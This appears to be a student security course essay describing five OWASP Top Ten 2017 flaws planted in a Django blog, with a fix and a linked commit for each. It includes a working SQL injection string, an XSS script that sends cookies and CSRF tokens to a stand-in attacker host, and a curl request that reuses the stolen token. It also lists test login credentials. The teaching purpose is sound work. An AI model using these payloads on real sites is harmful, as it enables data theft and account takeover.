# Security flaws from OWASP Top Ten 2017

This essay uses the OWASP Top Ten 2017 list: https://owasp.org/www-project-top-ten/2017.

LINK: https://github.com/vastus/cybsec21-project1

## Setup

Use at least python 3.8 or higher.

```
git clone git@github.com:vastus/cybsec21-project1.git
cd cybsec21-project1
pip install -U pip && pip install -r requirements.txt
cd project1
./manage.py migrate
./manage.py seed # this will take a while (< 1min)
./manage.py runserver # by default will run on localhost:8000
```

You may use the following credentials to log in on http://0.0.0.0:8000/login (or wherever your dev server runs):

- admin@lo.co/AdminPass99
- jo@nes.bo/AuthorPass99
- testos@teroni.fi/TestosPass99

---

FLAW 1:
https://github.com/vastus/cybsec21-project1/blob/609cd90364be41e2b3df20bd72335be239bb46ae/project1/blog/views.py#L29

## Flaw 1: A1:2017-Injection

The first flaw shows a SQL injection vulnerability.

The app in question is a blog. The different roles of users of the blog can be an admin, author, user, or guest. Guest is the only unauthenticated role meaning that guests do not or are not signed in to the web application.

For this flaw it doesn't matter if the user is authenticated or not. The injection flaw is vulnerable through the search functionality of the application. The search functionality can be accessed from any page of the app.

The flaw can be triggered for example in the following way:

1. go to the home page of the app
2. paste the following as the search query

```
%' and false union select 1337,email,1337,1337 from blog_user --
```

This will query the user table for the application and expose all the email addresses for each registered account. Changing the column name to any other column in the user table will expose its values. The SQL injection described in this flaw doesn't allow the execution of multiple statements but this vulnerability is a serious weakness since it can be used to expose all the data stored in the database.

## Flaw 1: Fixing the SQL injection

Instead of using raw SQL to perform the search one should use an ORM or escape the input used for the searching. Since this app is made with Django, the ORM should be used.

The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/blob/7355ba0c02171a1833733d8dfd6e1706be61d637/project1/blog/views.py#L25.

---

FLAW 2:
https://github.com/vastus/cybsec21-project1/blob/0d6dd7cf68128481a71d8fe1c617648ea5e75d03/project1/blog/templates/blog/posts/show.html#L68

## Flaw 2: A7:2017-Cross-Site Scripting (XSS)

The blog allows registered users to comment on posts. The comment form includes a hidden input field that's named `current_user_id` which the application uses to figure out who's the commenter. An attacker could alter the value of this field to impose commenting as someone else.

It's possible to inject `<script>` tags to the comment since the developers of the blog wanted to allow users to input their own markdown or styles to the comments but without further inspection this of course allows XSS attacks as well.

An attack might occur when after the attacker has registered and logged in to the site and they visit a post and comment on the post with the following comment body:

```
Interesting read...

<script>
const csrfmiddlewaretoken = document.querySelector('input[name=csrfmiddlewaretoken]').value;
const data = {cookie: document.cookie, csrfmiddlewaretoken};
fetch('https://h4x.or:1337/csrf-tokens', {method: 'POST', body: JSON.stringify({data})});
</script>
```

Given that the attacker has set up the server where the POST request is sending the CSRF token they can then use the token and another user ID to comment on posts as someone else.

An example request to exploit the vulnerability:

```
curl 'http://blog/posts/1/comments' \
     -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: csrftoken=$CSRF_TOKEN_FROM_COOKIE_PAYLOAD' \
     --data-raw 'csrfmiddlewaretoken=$CSRF_MIDDLEWARE_TOKEN_FROM_PAYLOAD&comment_user_id=1&comment_body=holup'
```

## Flaw 2: Fixing the XSS weakness

First of all the application should figure out the current user from the session instead of getting it from the hidden input field. All user input should be considered unsafe. The way that the comment body is rendered needs to be changed from safe to unsafe, so that the browser doesn't interpret the HTML tags (e.g. `<script>`).

The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/commit/c2e0b18a1357461d6224466c1196e1a4ad9e8438

---

FLAW 3:
https://github.com/vastus/cybsec21-project1/blob/4db57645b870df1ff1c2bcc6cf4ca8f53f6668f2/project1/blog/views.py#L87

## Flaw 3: A5:2017-Broken Access Control

It's easy to forget to correctly control the access within different parts of an application. The blog allows users to profiles (/profile/<user_id>). If the current user is viewing their own profile and they're signed in they can change their email address if they so wish. The developers of the blog coded the feature to fetch the updated user record by the user ID that's provided in the URL. This of course is an obvious case of broken access control where any logged in user may change other users information. An attacker might change admin's email address for example and request a new password which would then allow them to log in as the admin user.

## Flaw 3: Fixing the broken access control

To fix this vulnerability we should only allow changes to the current user's profile and not to anyone else's. Instead of updating the user record (identified by the user ID from the URL) we should check that the profile that is updated is only in the scope of the currently signed in user that's identified from the session.

The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/commit/f0c639aeca1988f694f0cfa98fa60d1923a4173e

---

FLAW 4:
https://github.com/vastus/cybsec21-project1/blob/4db57645b870df1ff1c2bcc6cf4ca8f53f6668f2/project1/blog/models.py#L54

** Flaw 4: A2_2017-Broken_Authentication.html

This flaw showcases broken authentication in terms of password strength. There are many examples where test credentials have been left on production instances, applications allow registration with weak passwords e.g. too short passwords or passwords that are too common that are vulnerable to dictionary attacks. Deciding on what are the characteristics of a strong password and still keep the password choosing somewhat user friendly is hard which is why usually using a password manager is recommended.

Allowing weak passwords leaves the application vulnerable for authentication attacks that attackers can use to gain access to unwanted systems or attackers practicing identity theft.

## Flaw 4: Fixing broken authentication

The fix shown in the commit is far from perfect but it is clearly better than not checking for password weaknesses at all. The blog's registration process now checks a few properties of the password provided to the register procedure: the length has to be at least 12 characters, there has to be enough variance in the used character set that the password is made of, and the password is compared against 10k common passwords. This is by no means an exhaustive list of steps ensuring the provided password isn't weak but it's a good start. Checking the password for weaknesses, as it is implemented in the app, is not too performant either but this essay focuses on security and not on performance thus that aspect of the procedure will be considered out of scope.

The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/commit/b08a723eedacd9ded2ae4b017943724b97527b72

---

FLAW 5:
https://github.com/vastus/cybsec21-project1/blob/5320b58cee848e9b113c1c682ddf711d0737054c/project1/blog/views.py#L48-L49

## Flaw 5: A10:2017-Insufficient Logging & Monitoring

It is very hard to analyze the usage of an application or service without proper logging and monitoring. Attackers can probe for vulnerabilities and try to penetrate by performing different kinds of high-frequency attacks. It's crucial to have decent logging, monitoring, and alerting. There aren't any logging used in the blog app at the moment. It would be hard to try to analyze the django logs and tell if someone was trying to forcefully authenticate, for example. To further improve the transparency of authentication in the app we should log whenever a user tries to log in to the blog.

## Flaw 5: Adding logs

Let's fix the insufficient logging in the app whenever a user tries to authenticate. Logging authentication can be split into 3 different types: a successful authentication when email/password combination is correct, a failed authentication when an existing user was found with the provided email but the password was incorrect, and lastly failed authentication when no user was found with the given email.

To simplify the fix, logging has been added only to the authentication process but it should be used with at least auditable events, wherever warnings or errors might occur, access control, and server failures.

An example log line of an authentication attempt that failed:

    [WARNING] 2021-12-10 13:00:12 - AUTH FAIL: existing username=sudo ip=13.37.90.01

The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/commit/448e79b7a8b9170d1ea7da0e810801718a317e69
